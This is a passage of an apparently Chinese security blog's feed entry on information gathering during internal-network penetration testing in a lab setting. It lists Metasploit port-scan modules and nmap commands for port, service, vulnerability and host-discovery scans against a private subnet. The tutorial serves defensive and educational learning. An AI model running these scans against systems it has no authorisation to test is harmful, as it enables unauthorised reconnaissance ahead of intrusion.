class="line">auxiliary/scanner/portscan/tcp          <span class="comment">#TCP端口扫描    </span></span><br><span class="line">auxiliary/scanner/portscan/xmas         <span class="comment">#TCP XMas端口扫描  </span></span><br></pre></td></tr></table></figure></li><li><p>nmap主机探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.101.209    <span class="comment">#最简单的扫描  </span></span><br><span class="line">nmap -sS -sV -T4 192.168.101.209    <span class="comment">#普遍的扫描方式  </span></span><br><span class="line">nmap -A -T4 192.168.101.209     <span class="comment">#全面扫描  </span></span><br><span class="line">nmap --top-ports 100 192.168.101.209    <span class="comment">#扫描可能开放的端口  </span></span><br><span class="line">nmap --script=vuln 192.168.101.209  <span class="comment">#扫描漏洞  </span></span><br><span class="line">nmap -Ss -p 1-65535 -v 192.168.101.209  <span class="comment">#快速扫描全端口  </span></span><br><span class="line">nmap -sP 192.168.101.0/24   <span class="comment">#快速扫描存活主机</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;信息收集是渗透测试中的重要环节，假定我们拿到了模拟环境中的其中一台机器，可以通过以下方式扩大自己拥有的信息：&lt;/p&gt;
&lt;h2 id=&quot;关于本机的信息收集&quot;&gt;&lt;a href=&quot;#关于本机的信息收集&quot; class=&quot;headerlink&quot; title=&quot;关于本机的信息收集&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="内网" scheme="https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="信息收集" scheme="https://zyth0n.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
